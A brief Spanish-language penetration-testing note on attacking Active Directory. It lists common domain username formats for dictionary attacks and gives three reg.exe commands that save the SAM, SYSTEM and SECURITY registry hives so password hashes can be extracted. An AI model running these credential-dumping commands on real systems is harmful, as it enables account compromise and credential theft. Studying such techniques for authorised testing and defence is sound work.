# Atacar Active Directory y NTDS.dit
## Descripción
Extraer credenciales mendiante el uso de ataque de diccionario contra cuenta de AD y dumpear hashes desde el NTDS.dit.

### Forma típica de usuarios en el Dominio
- **firstinitiallastname:** jdoe
- **firstinitialmiddleinitiallastname:** jjdoe
- **firstnamelastname:** janedoe
- **firstname.lastname:** jane.doe
- **lastname.firstname:** doe.jane
- **nickname:** doedoehacksstuff

```python
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```
